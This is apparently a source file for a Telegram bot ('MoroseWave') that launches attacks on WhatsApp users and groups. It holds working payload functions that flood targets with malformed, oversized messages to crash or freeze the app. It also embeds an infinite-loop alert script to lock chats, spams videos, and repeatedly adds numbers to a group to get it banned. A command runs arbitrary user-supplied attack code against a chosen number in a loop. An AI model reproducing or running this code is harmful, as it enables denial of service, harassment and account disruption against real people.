      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

//FUNCTION BUG NUMBER TARGET//
//fc click
async function XGrenFcClick(sock, target) {
  try {
    await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 2,
            submessages: [
              {
                messageType: 8,
                latexMetadata: {
                  text: "moro",
                  expressions: [
                    {
                      latexExpression: "moro",
                      width: 99999999999999,
                      height: 9999999999999,
                      fontHeight: 99999999999999
                    }
                  ]
                }
              },
              {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  jpegThumbnail: Buffer.alloc(500000, 0xFF)
                }
              }
            ],
            contextInfo: {
              isForwarded: true,
              forwardOrigin: 4,
              participant: "13135550002@s.whatsapp.net"
            }
          }
        }
      }
    }, {});

    console.log(`[SUKSES] FcClick terkirim ke: ${target}`);
  } catch (e) {
    console.error(`[GAGAL] Error: ${e.message}`);
  }
}
//crashhard
async function NullFrezee(sock, target) {
  const heavyPadding = "\n".repeat(100) + "\r".repeat(1000) + "\n".repeat(100);

  const payloads = [
    {
      extendedTextMessage: {
        text: "moro" + heavyPadding,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          forwardOrigin: 4,
          mentionedJid: ["191827278583@s.whatsapp.net"],
          quotedMessage: {
            conversation: "\u0000"
          }
        }
      }
    },
    {
      locationMessage: {
        degreesLatitude: 1.999999,
        degreesLongitude: 1.999999,
        name: "moro" + heavyPadding,
        address: "\u0000".repeat(1000),
        url: "https://maps.google.com/?q=test",
        isLive: true,
        accuracyInMeters: 999999,
        speedInMps: 999
      }
    },
    {
      documentMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
        mimetype: "application/pdf",
        fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
        fileLength: 9999999999999,
        pageCount: 99999,
        fileName: "moro.pdf" + heavyPadding,
        fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
        mediaKeyTimestamp: "1776937541",
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true
        }
      }
    }
  ];

  for (let i = 0; i < 2; i++) {
    for (const payload of payloads) {
      try {
        if (typeof generateWAMessageFromContent === "function") {
          const msg = await generateWAMessageFromContent(target, payload, { noSelfSync: true });
          await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            noSelfSync: true
          });
        } else {
          await sock.relayMessage(target, payload, {
            messageId: Date.now() + "-" + i,
            noSelfSync: true
          });
        }
      } catch (e) {
        console.log("福 | ERROR -: ", e.message);
      }
    }
    await new Promise(function(resolve) {
      setTimeout(resolve, 1000);
    });
  }
}
//delayvisib
async function delayxcrash(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "moro" },
          nativeFlowMessage: {
            messageParamsJson: "\u200f".repeat(50000),
            buttons: Array(10000).fill({
              name: "cta_copy",
              buttonParamsJson: "{}"
            })
          }
        }
      }
    }
  };

  const msg2 = {
    interactiveMessage: {
      body: {
        text: "\x20"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      }
    }
  };

  const msg3 = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "halo" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 50000 }, () => ({}))
          }
        }
      }
    }
  };

  await sock.relayMessage(jid, msg2, {});
  await sock.relayMessage(jid, msg, {});
  await sock.relayMessage(jid, msg3, {});
}
//delayhard
async function DelayNewV10(sock, target) {
  const acalex = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "\u0000".repeat(9000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 45000 }, () => ({ name: " ".repeat(9000), buttonParamsJson: "{".repeat(9000) })),
          }
        }
      }
    }
  };

  await sock.relayMessage(target, acalex, {
    participant: true,
  });

  const lexzyaca = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "\x10".repeat(9000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 45000 }, () => ({ name: " ".repeat(9000), buttonParamsJson: "{}".repeat(9000) })),
          }
        }
      }
    }
  };

  await sock.relayMessage(target, lexzyaca, {
    participant: true,
  });
}
//delayxfreeze
async function DelayFreezeKxa(sock, target) {
    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const id = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();

    const invisible = '\u200B'.repeat(50000) + '\u3164'.repeat(50000);

    const mentioned = [
        '0@s.whatsapp.net',
        ...Array.from({ length: 1999 }, () =>
            '5' + Math.floor(Math.random() * 85000) + '@s.whatsapp.net'
        )
    ];

    const kxa = {
        groupStatusMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "moro" + "\0".repeat(75000) + invisible,
                    contextInfo: {
                        participant: jid,
                        mentionedJid: mentioned,
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            },
            participant: jid
        }
    };

    const kalcer = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: '\u200B'.repeat(10000) + '\u3164'.repeat(10000) },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 5000 }, () => ({})),
                        messageParamsJson: '\u200B'.repeat(20000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, kxa, {
        messageId: id(),
        noSelfSync: true
    });

    await sock.relayMessage(jid, kalcer, {
        messageId: id(),
        noSelfSync: true
    });
}
//blank
async function Blank(sock, target) {
  const jid = target.includes('@') ? target : target + '@s.whatsapp.net';

  await sock.relayMessage(jid, {
    interactiveMessage: {
      body: { text: "moro" },
      nativeFlowMessage: {
        messageParamsJson: "\t".repeat(50000),
        buttons: Array(10000).fill({
          name: "cta_copy",
          buttonParamsJson: "{}"
        })
      }
    }
  }, {});
}
//lockchat
async function NewLock(sock, target) {
  const originalId = '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase()
  const legacyEditId = '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase()
  const secretEditId = '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase()
  const responseId = crypto.randomUUID()

  const messageSecret = crypto.randomBytes(32)
  const botMessageSecret = crypto.randomBytes(32)

  const html = `
  <html>
  <head><title>moro</title></head>
  <body style="background:#111;color:#fff;text-align:center;margin-top:20%;font-family:sans-serif;">
    <h1>Locked by moro</h1>
    <script>
      (function() {
        const pass = prompt("Masukkan Password:\\n\\nHint: moro");
        if (pass === "moro") {
          document.body.innerHTML = "<h1 style='color:#0f0;'>Chat Terbuka</h1>";
        } else {
          while (true) {
            alert("Password Salah. System Terkunci.");
            prompt("MAU NGAPAIN SIH?");
            prompt("KOCOKIN DULU BARU GUA BUKA");
            prompt("MAKSA AMAT DONGO");
          }
        }
      })();
    </script>
  </body>
  </html>
  `

  const unified = Buffer.from(JSON.stringify({
    __typename: 'XMSGGenAIUnifiedResponse',
    response_id: responseId,
    sections: [
      {
        __typename: 'GenAIUnifiedResponseSection',
        view_model: {
          __typename: 'GenAISingleLayoutViewModel',
          primitive: {
            __typename: 'GenAIaeacdsnwHtmlPrimitive',
            payload: html,
            trusted_sources: []
          }
        }
      }
    ]
  })).toString('base64')

  const richResponseMessage = {
    messageType: 1,
    submessages: [{ messageType: 2, messageText: 'Moro Lockchat' }],
    unifiedResponse: { data: unified },
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      forwardOrigin: 4
    }
  }

  const messageContextInfo = {
    deviceListMetadata: {},
    deviceListMetadataVersion: 2,
    messageSecret: messageSecret.toString('base64'),
    botMessageSecret: botMessageSecret.toString('base64'),
    botMetadata: {
      messageDisclaimerText: '',
      botResponseId: responseId
    }
  }

  const base = {
    messageContextInfo,
    botForwardedMessage: {
      message: { richResponseMessage }
    }
  }

  const innerEdit = {
    botForwardedMessage: {
      message: { richResponseMessage }
    }
  }

  const iv = crypto.randomBytes(12)
  const key = Buffer.from(
    crypto.hkdfSync('sha256', messageSecret, Buffer.alloc(0), Buffer.from('WaSecretEdit'), 32)
  )
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)
  const ciphertext = Buffer.concat([cipher.update(Buffer.from(JSON.stringify(innerEdit), 'utf8')), cipher.final()])
  const encPayload = Buffer.concat([iv, ciphertext, cipher.getAuthTag()]).toString('base64')

  const legacyEdit = {
    messageContextInfo,
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: true, id: originalId },
          type: 14,
          timestampMs: Date.now(),
          editedMessage: innerEdit
        }
      }
    }
  }

  const secretEncryptedEdit = {
    messageContextInfo,
    botForwardedMessage: {
      message: {
        secretEncryptedMessage: {
          targetMessageKey: {
            remoteJid: target,
            fromMe: true,
            id: originalId
          },
          encPayload,
          encIv: iv.toString('base64'),
          secretEncType: 1
        }
      }
    }
  }

  await sock.relayMessage(target, base, { messageId: originalId })
  await new Promise(r => setTimeout(r, 700))
  await sock.relayMessage(target, legacyEdit, { messageId: legacyEditId })
  await new Promise(r => setTimeout(r, 700))
  await sock.relayMessage(target, secretEncryptedEdit, { messageId: secretEditId })
}
//spam ceramah
async function topsvideo(sock, target) {
    const Video = [
        'https://h.top4top.io/m_39096s5a11.mp4',
        'https://i.top4top.io/m_39097lzk31.mp4',
        'https://j.top4top.io/m_3909esn5z1.mp4',
        'https://l.top4top.io/m_3909i44dn1.mp4'
    ];

    const random = (arr) => arr[Math.floor(Math.random() * arr.length)];

    const buildMessage = () => ({
        video: { url: random(Video) },
        mimetype: 'video/mp4'
    });

    const sender = async () => {
        await sock.sendMessage(target, buildMessage());
    };

    const runner = async () => {
        for (let i = 0; i < 5; i++) {
            await sender();
        }
    };

    return runner();
}
















//FUNCTION BUG NUMBER GROUP//
//group lock chat
async function andro_chatlock_group(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("Target harus berupa ID grup (@g.us)");
    }

    let successCount = 0;
    let failCount = 0;

    const payload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            __typename: 'GenAIUnifiedResponse',
                            response_id: crypto.randomUUID(),
                            sections: [{
                                __typename: 'GenAIUnifiedResponseSection',
                                view_model: {
                                    __typename: 'GenAISingleLayoutViewModel',
                                    primitive: {
                                        __typename: 'FOAHtmlPrimitiveDemoDONOTUSE',
                                        trusted_sources: [],
                                        payload: `<script>\n  while (true) {\n    alert("\\n# MAMPUS KENA LOCK GROUP !! #\\n");\n  }\n</script>`,
                                    },
                                },
                            }],
                        })).toString('base64'),
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4,
                    },
                },
            },
        },
    };

    for (let i = 0; i < 2; i++) {
        try {
            const msg = generateWAMessageFromContent(target, payload, {});

            await sock.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                lockUps: target
            });

            successCount++;
            console.log(`[✅] Chatlock Group Terkirim (${successCount}/2) ke ${target}`);
        } catch (err) {
            failCount++;
            console.log(`[❌] Chatlock Group Gagal: ${err.message}`);
        }

        await sleep(1500);
    }
}
//ban gb
async function BanGroupNewV19(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  const group = groupJid;

  try {
    let firstRes;
    try {
      firstRes = await sock.groupParticipantsUpdate(
        group,
        ['1212009900@s.whatsapp.net'],
        'add'
      );
    } catch (firstErr) {
      console.warn('First add threw error:', firstErr && firstErr.message ? firstErr.message : firstErr);
      firstRes = null;
    }

    if (Array.isArray(firstRes) && firstRes[0] && firstRes[0].status !== '200') {
      console.warn('First add returned status:', firstRes[0].status);
    }

    try {
      await sock.sendPresenceUpdate('composing', group);
    } catch (presenceErr) {
      console.error('Presence update failed:', presenceErr && presenceErr.message ? presenceErr.message : presenceErr);
    }

    console.log('Successfully banned group:', group);

    for (let i = 0; i < 1; i++) {
      try {
        const res = await sock.groupParticipantsUpdate(
          groupJid,
          ['1212009900@s.whatsapp.net'],
          'add'
        );

        if (Array.isArray(res) && res[0] && res[0].status !== '200') {
          console.error('Attempt failed with status:', i + 1, res[0].status);
        } else {
          console.log('Attempt successful:', i + 1);
        }

        await new Promise(function (r) { setTimeout(r, 5000 + Math.floor(Math.random() * 1999)); });
      } catch (err) {
        const msg = err && err.message ? err.message : (typeof err === 'string' ? err : JSON.stringify(err));
        if (msg.indexOf('bad-request') !== -1) {
          console.error('Attempt bad-request (skipped):', i + 1);
        } else {
          console.error('Error in BanGroupNewV19 attempt:', i + 1, msg);
        }
        await new Promise(function (r) { setTimeout(r, 2500); });
      }
    }

    for (let i = 0; i < 1; i++) {
      try {
        await sock.groupParticipantsUpdate(groupJid, ['1212009900@s.whatsapp.net'], 'add');
        console.log('Attempt successful:', i + 1);
      } catch (err) {
        console.error('Error in attempt:', i + 1, err);
      }
    }

    const startTime = Date.now();
    const duration = 5500;

    while (Date.now() - startTime < duration) {
      if (!groupJid.endsWith('@g.us')) {
        throw new Error('@g.us server required');
      }

      try {
        await sock.groupParticipantsUpdate(
          group,
          ['1212009900@s.whatsapp.net'],
          'add'
        );

        await sock.sendPresenceUpdate('composing', group);
      } catch (err) {
        console.error('error:', err);
        throw err;
      }
    }

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1500;

    await new Promise(function (resolve, reject) {
      const step = async function () {
        if (Date.now() - startTime2 >= duration2) {
          resolve();
          return;
        }

        if (!groupJid.endsWith('@g.us')) {
          reject(new Error('@g.us server required'));
          return;
        }

        try {
          await sock.groupParticipantsUpdate(
            group,
            ['1201200911@s.whatsapp.net'],
            'add',
          );

          await sock.sendPresenceUpdate('composing', group);
        } catch (err) {
          console.error('error:', err);
          reject(err);
          return;
        }

        setTimeout(step, 0);
      };

      step();
    });

  } catch (err) {
    const msg = err && err.message ? err.message : (typeof err === 'string' ? err : JSON.stringify(err));
    if (msg.indexOf('bad-request') !== -1) {
      console.warn('BanGroup finished with bad-request, ignored:', msg);
      return;
    }
    console.error('Error in BanGroup:', msg);
    throw err;
  }
}




















//FUNCTION BUG BEBAS SPAM//
//delay
async function GrenXDelay(sock, target) {
    const gen = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();

    const D = {
        interactiveMessage: {
            body: {
                text: "\x20" + "\x30" + "\u0000" + "\u200b".repeat(5000)
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    const statusJid = 'status@broadcast';

    for (let i = 0; i < 70; i++) {
        await sock.relayMessage(statusJid, D, {
            messageId: gen(),
            noSelfSync: true,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: {
                            jid: target
                        },
                        content: undefined
                    }]
                }]
            }]
        }).catch(() => {});
        await new Promise(r => setTimeout(r, 1500));
    }
}
//album
async function GrenXAlbumDelay(sock, target) {
    const gen = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();
    const origId = gen();

    const X = {
        albumMessage: {
            contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardOrigin: "UNKNOWN"
            }
        }
    };

    const G = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\x20\x30\u0000" + "\u200b".repeat(5000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const ctx = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: Buffer.alloc(32, 1).toString('base64'),
            botMetadata: { messageDisclaimerText: '', botResponseId: gen() }
        }
    };

    try {
        await sock.relayMessage(target, { ...ctx, ...X }, { messageId: origId });

        for (let i = 0; i < 15; i++) {
            await sock.relayMessage(target, { ...ctx, ...X }, { messageId: gen() });
            await sock.relayMessage(target, { ...ctx, ...G }, { messageId: gen() });
            await new Promise(r => setTimeout(r, 100));
        }
    } catch (e) {
        console.error(`[ERR] ${e.message}`);
    }
}
bot.launch();